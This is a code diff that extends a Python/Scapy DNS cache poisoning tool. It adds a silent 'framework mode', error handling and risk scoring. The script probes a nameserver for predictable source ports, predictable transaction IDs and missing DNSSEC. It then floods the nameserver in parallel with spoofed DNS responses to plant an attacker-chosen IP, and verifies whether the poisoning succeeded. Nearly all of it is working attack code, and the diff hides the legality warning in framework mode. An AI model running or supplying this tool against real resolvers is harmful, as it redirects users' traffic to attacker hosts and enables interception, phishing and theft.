@@ -8,6 +8,7 @@ import time
 import argparse
 import logging
 import json
+import os
 from datetime import datetime
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -22,19 +23,51 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 class DNSCachePoisoner:
-    def __init__(self, target_domain, nameserver, spoofed_ip, record_type='A'):
+    def __init__(self, target_domain, nameserver, spoofed_ip, record_type='A', framework_mode=False):
         self.target_domain = target_domain
         self.nameserver = nameserver
         self.spoofed_ip = spoofed_ip
         self.record_type = record_type
+        self.framework_mode = framework_mode
         self.transaction_id = random.randint(0, 65535)
         self.query_port = random.randint(1024, 65535)
         self.results = {
+            'status': 'initialized',
+            'target_domain': target_domain,
+            'nameserver': nameserver,
+            'record_type': record_type,
+            'timestamp': datetime.now().isoformat(),
             'vulnerability_checks': [],
             'poisoning_attempts': [],
-            'success_rate': 0.0
+            'success_rate': 0.0,
+            'summary': {
+                'is_vulnerable': False,
+                'vulnerabilities_found': [],
+                'successful_poisoning': False,
+                'risk_level': 'Unknown'
+            }
         }
-        
+
+    def log_message(self, level, message):
+        """Unified logging that respects framework mode"""
+        if self.framework_mode:
+            # In framework mode, only log errors or add to results
+            if level == 'error':
+                self.results['status'] = 'error'
+                self.results['error'] = message
+            elif level == 'warning':
+                if 'warnings' not in self.results:
+                    self.results['warnings'] = []
+                self.results['warnings'].append(message)
+        else:
+            # In standalone mode, use logger
+            if level == 'info':
+                logger.info(message)
+            elif level == 'warning':
+                logger.warning(message)
+            elif level == 'error':
+                logger.error(message)
+
     def generate_dns_query(self, qtype='A'):
         """Generate a DNS query packet with specified record type"""
         return IP(dst=self.nameserver)/\
@@ -80,49 +113,69 @@ class DNSCachePoisoner:
 
     def check_source_port_randomization(self, num_queries=10):
         """Test if the DNS server uses random source ports"""
-        logger.info("Testing source port randomization...")
+        self.log_message('info', "Testing source port randomization...")
         ports = set()
         
         for _ in range(num_queries):
-            query = self.generate_dns_query()
-            reply = sr1(query, timeout=2, verbose=0)
-            if reply and UDP in reply:
-                ports.add(reply[UDP].sport)
-            time.sleep(0.5)
+            try:
+                query = self.generate_dns_query()
+                reply = sr1(query, timeout=2, verbose=0)
+                if reply and UDP in reply:
+                    ports.add(reply[UDP].sport)
+                time.sleep(0.5)
+            except Exception as e:
+                self.log_message('warning', f"Error during port randomization check: {str(e)}")
         
         port_randomization = len(ports) > num_queries * 0.8
-        self.results['vulnerability_checks'].append({
+        check_result = {
             'check': 'source_port_randomization',
             'vulnerable': not port_randomization,
-            'details': f"Unique ports observed: {len(ports)}/{num_queries}"
-        })
+            'details': f"Unique ports observed: {len(ports)}/{num_queries}",
+            'risk_level': 'High' if not port_randomization else 'Low'
+        }
+        self.results['vulnerability_checks'].append(check_result)
+        
+        if not port_randomization:
+            self.results['summary']['vulnerabilities_found'].append('Predictable source ports')
+            if self.results['summary']['risk_level'] != 'Critical':
+                self.results['summary']['risk_level'] = 'High'
         
         return not port_randomization
 
     def check_txid_randomization(self, num_queries=10):
         """Test if the DNS server uses random transaction IDs"""
-        logger.info("Testing transaction ID randomization...")
+        self.log_message('info', "Testing transaction ID randomization...")
         txids = set()
         
         for _ in range(num_queries):
-            query = self.generate_dns_query()
-            reply = sr1(query, timeout=2, verbose=0)
-            if reply and DNS in reply:
-                txids.add(reply[DNS].id)
-            time.sleep(0.5)
+            try:
+                query = self.generate_dns_query()
+                reply = sr1(query, timeout=2, verbose=0)
+                if reply and DNS in reply:
+                    txids.add(reply[DNS].id)
+                time.sleep(0.5)
+            except Exception as e:
+                self.log_message('warning', f"Error during TXID randomization check: {str(e)}")
         
         txid_randomization = len(txids) > num_queries * 0.8
-        self.results['vulnerability_checks'].append({
+        check_result = {
             'check': 'txid_randomization',
             'vulnerable': not txid_randomization,
-            'details': f"Unique TXIDs observed: {len(txids)}/{num_queries}"
-        })
+            'details': f"Unique TXIDs observed: {len(txids)}/{num_queries}",
+            'risk_level': 'High' if not txid_randomization else 'Low'
+        }
+        self.results['vulnerability_checks'].append(check_result)
+        
+        if not txid_randomization:
+            self.results['summary']['vulnerabilities_found'].append('Predictable transaction IDs')
+            if self.results['summary']['risk_level'] != 'Critical':
+                self.results['summary']['risk_level'] = 'High'
         
         return not txid_randomization
 
     def detect_vulnerability(self):
         """Enhanced vulnerability detection with multiple checks"""
-        logger.info(f"Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
+        self.log_message('info', f"Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
         
         vulnerabilities = []
         
@@ -135,44 +188,62 @@ class DNSCachePoisoner:
             vulnerabilities.append("Predictable transaction IDs")
             
         # Check for DNSSEC
-        query = self.generate_dns_query()
-        reply = sr1(query, timeout=2, verbose=0)
-        has_dnssec = False
+        try:
+            query = self.generate_dns_query()
+            reply = sr1(query, timeout=2, verbose=0)
+            has_dnssec = False
+            
+            if reply and DNS in reply:
+                if reply[DNS].ar and any(rr.type == 46 for rr in reply[DNS].ar):
+                    has_dnssec = True
+            
+            check_result = {
+                'check': 'dnssec',
+                'vulnerable': not has_dnssec,
+                'details': "DNSSEC not implemented",
+                'risk_level': 'Medium' if not has_dnssec else 'Low'
+            }
+            self.results['vulnerability_checks'].append(check_result)
+            
+            if not has_dnssec:
+                vulnerabilities.append("No DNSSEC protection")
+                if self.results['summary']['risk_level'] == 'Unknown':
+                    self.results['summary']['risk_level'] = 'Medium'
+        except Exception as e:
+            self.log_message('warning', f"Error during DNSSEC check: {str(e)}")
         
-        if reply and DNS in reply:
-            if reply[DNS].ar and any(rr.type == 46 for rr in reply[DNS].ar):
-                has_dnssec = True
-        
-        self.results['vulnerability_checks'].append({
-            'check': 'dnssec',
-            'vulnerable': not has_dnssec,
-            'details': "DNSSEC not implemented"
-        })
-        
-        if not has_dnssec:
-            vulnerabilities.append("No DNSSEC protection")
+        # Update summary
+        self.results['summary']['is_vulnerable'] = bool(vulnerabilities)
+        if vulnerabilities:
+            self.results['summary']['vulnerabilities_found'].extend(
+                [v for v in vulnerabilities if v not in self.results['summary']['vulnerabilities_found']]
+            )
         
         return bool(vulnerabilities), ", ".join(vulnerabilities) if vulnerabilities else "No obvious vulnerabilities detected"
 
     def poison_worker(self, attempt_id):
         """Worker function for parallel poisoning attempts"""
-        legitimate_query = self.generate_dns_query(self.record_type)
-        send(legitimate_query, verbose=0)
-        
-        # Send multiple spoofed responses with different transaction IDs
-        for _ in range(50):
-            self.transaction_id = random.randint(0, 65535)
-            spoofed_response = self.generate_spoofed_response(self.record_type)
-            send(spoofed_response, verbose=0)
-        
-        return attempt_id
+        try:
+            legitimate_query = self.generate_dns_query(self.record_type)
+            send(legitimate_query, verbose=0)
+            
+            # Send multiple spoofed responses with different transaction IDs
+            for _ in range(50):
+                self.transaction_id = random.randint(0, 65535)
+                spoofed_response = self.generate_spoofed_response(self.record_type)
+                send(spoofed_response, verbose=0)
+            
+            return attempt_id
+        except Exception as e:
+            self.log_message('warning', f"Error in poisoning worker {attempt_id}: {str(e)}")
+            return None
 
     def poison_cache(self, duration=30, max_attempts=1000, max_workers=10):
         """Enhanced cache poisoning with parallel processing"""
-        logger.info(f"Attempting cache poisoning attack on {self.nameserver}")
-        logger.info(f"Target domain: {self.target_domain}")
-        logger.info(f"Spoofed IP: {self.spoofed_ip}")
-        logger.info(f"Record type: {self.record_type}")
+        self.log_message('info', f"Attempting cache poisoning attack on {self.nameserver}")
+        self.log_message('info', f"Target domain: {self.target_domain}")
+        self.log_message('info', f"Spoofed IP: {self.spoofed_ip}")
+        self.log_message('info', f"Record type: {self.record_type}")
         
         start_time = time.time()
         successful_attempts = 0
@@ -190,53 +261,80 @@ class DNSCachePoisoner:
                     # Process completed attempts
                     for future in as_completed(futures):
                         attempt_id = future.result()
+                        if attempt_id is None:
+                            continue
                         
                         # Verify if poisoning was successful
-                        verify_query = self.generate_dns_query(self.record_type)
-                        reply = sr1(verify_query, timeout=2, verbose=0)
-                        
-                        if reply and DNS in reply and reply[DNS].an:
-                            for rr in reply[DNS].an:
-                                if rr.rdata == self.spoofed_ip:
-                                    successful_attempts += 1
-                                    logger.info(f"Successful poisoning detected! (Attempt {attempt_id})")
-                        
-                        if total_attempts % 10 == 0:
-                            logger.info(f"Made {total_attempts} attempts, {successful_attempts} successful...")
+                        try:
+                            verify_query = self.generate_dns_query(self.record_type)
+                            reply = sr1(verify_query, timeout=2, verbose=0)
+                            
+                            if reply and DNS in reply and reply[DNS].an:
+                                for rr in reply[DNS].an:
+                                    if rr.rdata == self.spoofed_ip:
+                                        successful_attempts += 1
+                                        self.log_message('info', f"Successful poisoning detected! (Attempt {attempt_id})")
+                            
+                            if total_attempts % 10 == 0:
+                                self.log_message('info', f"Made {total_attempts} attempts, {successful_attempts} successful...")
+                        except Exception as e:
+                            self.log_message('warning', f"Error verifying attempt {attempt_id}: {str(e)}")
                         
                         time.sleep(0.1)
         
         except KeyboardInterrupt:
-            logger.warning("\nAttack interrupted by user")
+            self.log_message('warning', "Attack interrupted by user")
+        except Exception as e:
+            self.log_message('error', f"Error during poisoning attack: {str(e)}")
         
         # Calculate success rate
         success_rate = (successful_attempts / total_attempts * 100) if total_attempts > 0 else 0
-        self.results['poisoning_attempts'].append({
+        attempt_result = {
             'total_attempts': total_attempts,
             'successful_attempts': successful_attempts,
             'success_rate': success_rate,
             'duration': time.time() - start_time
-        })
+        }
+        self.results['poisoning_attempts'].append(attempt_result)
         
-        logger.info(f"Attack completed after {total_attempts} attempts")
-        logger.info(f"Success rate: {success_rate:.2f}%")
+        # Update summary
+        self.results['success_rate'] = success_rate
+        self.results['summary']['successful_poisoning'] = successful_attempts > 0
+        
+        if successful_attempts > 0:
+            self.results['summary']['risk_level'] = 'Critical'
+        
+        self.log_message('info', f"Attack completed after {total_attempts} attempts")
+        self.log_message('info', f"Success rate: {success_rate:.2f}%")
         
         return successful_attempts > 0
 
     def save_results(self, output_file):
         """Save attack results to a file"""
-        self.results['timestamp'] = datetime.now().isoformat()
-        self.results['target_domain'] = self.target_domain
-        self.results['nameserver'] = self.nameserver
-        self.results['record_type'] = self.record_type
-        
-        output_path = Path(output_file)
-        output_path.parent.mkdir(parents=True, exist_ok=True)
-        
-        with open(output_path, 'w') as f:
-            json.dump(self.results, f, indent=4)
-        
-        logger.info(f"Results saved to {output_file}")
+        try:
+            output_path = Path(output_file)
+            output_path.parent.mkdir(parents=True, exist_ok=True)
+            
+            # Update final status
+            if self.results['status'] == 'initialized':
+                self.results['status'] = 'completed'
+            
+            with open(output_path, 'w') as f:
+                json.dump(self.results, f, indent=4)
+            
+            self.log_message('info', f"Results saved to {output_file}")
+            
+            # Return results for framework mode
+            if self.framework_mode:
+                return self.results
+            
+        except Exception as e:
+            self.log_message('error', f"Error saving results: {str(e)}")
+            if self.framework_mode:
+                return {
+                    'status': 'error',
+                    'error': str(e)
+                }
 
 def main():
     parser = argparse.ArgumentParser(description='Enhanced DNS Cache Poisoning Tool')
@@ -255,49 +353,75 @@ def main():
                        help='Number of parallel threads for poisoning')
     parser.add_argument('--output', type=str, default='dns_poison_results.json',
                        help='Output file for results')
+    parser.add_argument('--framework-mode', action='store_true',
+                       help='Run in framework integration mode')
     
     args = parser.parse_args()
     
-    # Print warning message
-    print("""
-    [!] WARNING: This tool is for educational purposes only.
-    [!] Unauthorized DNS cache poisoning attempts are illegal.
-    [!] Use only on systems you have permission to test.
-    """)
+    # Print warning message only in standalone mode
+    if not args.framework_mode:
+        print("""
+        [!] WARNING: This tool is for educational purposes only.
+        [!] Unauthorized DNS cache poisoning attempts are illegal.
+        [!] Use only on systems you have permission to test.
+        """)
     
     # Check if running as root/admin
     if os.geteuid() != 0:
-        logger.error("This script requires root/administrator privileges")
+        error_msg = "This script requires root/administrator privileges"
+        if args.framework_mode:
+            print(json.dumps({
+                'status': 'error',
+                'error': error_msg,
+                'requires_root': True
+            }))
+        else:
+            logger.error(error_msg)
         sys.exit(1)
     
-    poisoner = DNSCachePoisoner(
-        args.target,
-        args.nameserver,
-        args.spoofed_ip,
-        args.record_type
-    )
-    
     try:
+        poisoner = DNSCachePoisoner(
+            args.target,
+            args.nameserver,
+            args.spoofed_ip,
+            args.record_type,
+            args.framework_mode
+        )
+        
         if args.mode in ['detect', 'both']:
             vulnerable, message = poisoner.detect_vulnerability()
-            logger.info("\nVulnerability Detection Results:")
-            logger.info(f"Status: {'Vulnerable' if vulnerable else 'Not Vulnerable'}")
-            logger.info(f"Details: {message}")
+            if not args.framework_mode:
+                logger.info("\nVulnerability Detection Results:")
+                logger.info(f"Status: {'Vulnerable' if vulnerable else 'Not Vulnerable'}")
+                logger.info(f"Details: {message}")
         
         if args.mode in ['poison', 'both']:
             if args.mode == 'both' and not vulnerable:
-                logger.warning("\nServer appears not vulnerable, but proceeding with poisoning attempt...")
+                poisoner.log_message('warning', "Server appears not vulnerable, but proceeding with poisoning attempt...")
             poisoner.poison_cache(
                 duration=args.duration,
                 max_attempts=args.max_attempts,
                 max_workers=args.threads
             )
         
-        # Save results
-        poisoner.save_results(args.output)
+        # Save and return results
+        results = poisoner.save_results(args.output)
+        
+        # In framework mode, print JSON results
+        if args.framework_mode:
+            print(json.dumps(results))
+        
+        return results
         
     except Exception as e:
-        logger.error(f"An error occurred: {str(e)}")
+        error_msg = str(e)
+        if args.framework_mode:
+            print(json.dumps({
+                'status': 'error',
+                'error': error_msg
+            }))
+        else:
+            logger.error(f"An error occurred: {error_msg}")
         sys.exit(1)
 
 if __name__ == "__main__":
